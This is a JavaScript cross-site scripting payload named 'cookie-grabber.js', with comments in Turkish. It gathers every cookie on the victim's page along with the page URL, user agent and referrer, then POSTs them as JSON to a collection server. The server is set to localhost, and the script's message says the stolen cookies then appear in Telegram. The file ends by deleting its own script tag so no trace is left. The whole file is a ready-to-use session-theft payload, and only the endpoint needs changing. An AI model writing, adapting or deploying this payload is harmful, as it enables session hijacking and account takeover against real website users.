// cookie-grabber.js - XSS Payload
(function() {
    'use strict';

    // Konfigürasyon (hardcoded değil, ama test için basit – production'da .env gibi external yap)
    const SERVER_URL = 'http://localhost:3000/send-cookie';  // Lokal server
    const TARGET_URL = window.location.href;  // XSS'in çalıştığı sayfa URL'si

    // Çerezleri topla (düzenli dict)
    const cookies = {};
    document.cookie.split('; ').forEach(cookie => {
        if (cookie) {
            const [key, value] = cookie.split('=');
            cookies[key] = value || '';  // Empty value'ları da ekle
        }
    });

    const data = {
        url: TARGET_URL,
        cookies_str: document.cookie,  // Raw string
        cookies: cookies,  // Düzenli dict
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,  // Ek info: UA
        referrer: document.referrer  // Nereden geldi?
    };

    // Server'a POST et
    fetch(SERVER_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        if (result.success) {
            console.log('✅ Çerezler server\'a gönderildi! Telegram\'da görünecek.');
        } else {
            console.log('❌ Gönderim hatası:', result.error);
        }
    })
    .catch(error => {
        console.log('❌ Ağ hatası:', error);  // CORS veya server offline
    });

    // Stealth: Script'i sil, iz bırakma (opsiyonel)
    document.currentScript.remove();
})();
